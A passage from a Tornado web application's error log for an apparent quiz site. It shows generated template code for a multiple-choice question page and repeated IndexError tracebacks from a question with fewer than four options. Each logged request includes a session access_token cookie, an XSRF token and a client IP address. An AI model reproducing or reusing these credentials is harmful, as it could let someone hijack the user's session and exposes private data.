 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059d7f18e4c8548017fb424&answers=%5B2%5D&cursor=0&_xsrf=52aa03f9a0d54ce49644546759814ff9', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '2.27.103.153', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFMM2t2SkRQU1FGODFldlg4djBFdGJEQURwTFNDMkVZOWROYjh6NEwyNE50blpDNHZvWkE0Q08xYTFvZGt0T1RVb1RsejFaQktHVWxaQ3JvYndFZzhnQkR0VTBZVGdaRFpE|1348064677|fd457ce5b9b5a84c7771deab9c635d3e0edf9eae; _xsrf=52aa03f9a0d54ce49644546759814ff9; __utma=188782963.1417250236.1348064643.1348064643.1348064643.1; __utmb=188782963.7.10.1348064643; __utmc=188782963; __utmz=188782963.1348064643.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 128.79ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059d7f18e4c8548017fb424&answers=%5B0%5D&cursor=11&_xsrf=52aa03f9a0d54ce49644546759814ff9', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '2.27.103.153', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFMM2t2SkRQU1FGODFldlg4djBFdGJEQURwTFNDMkVZOWROYjh6NEwyNE50blpDNHZvWkE0Q08xYTFvZGt0T1RVb1RsejFaQktHVWxaQ3JvYndFZzhnQkR0VTBZVGdaRFpE|1348064677|fd457ce5b9b5a84c7771deab9c635d3e0edf9eae; _xsrf=52aa03f9a0d54ce49644546759814ff9; __utma=188782963.1417250236.1348064643.1348064643.1348064643.1; __utmb=188782963.7.10.1348064643; __utmc=188782963; __utmz=188782963.1348064643.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 90.16ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059d7f18e4c8548017fb424&answers=%5B3%5D&cursor=13&_xsrf=52aa03f9a0d54ce49644546759814ff9', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '93', 'Accept-Language': 'en-GB,en-US;q=0.8,en;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '2.27.103.153', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFMM2t2SkRQU1FGODFldlg4djBFdGJEQURwTFNDMkVZOWROYjh6NEwyNE50blpDNHZvWkE0Q08xYTFvZGt0T1RVb1RsejFaQktHVWxaQ3JvYndFZzhnQkR0VTBZVGdaRFpE|1348064677|fd457ce5b9b5a84c7771deab9c635d3e0edf9eae; _xsrf=52aa03f9a0d54ce49644546759814ff9; __utma=188782963.1417250236.1348064643.1348064643.1348064643.1; __utmb=188782963.7.10.1348064643; __utmc=188782963; __utmz=188782963.1348064643.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
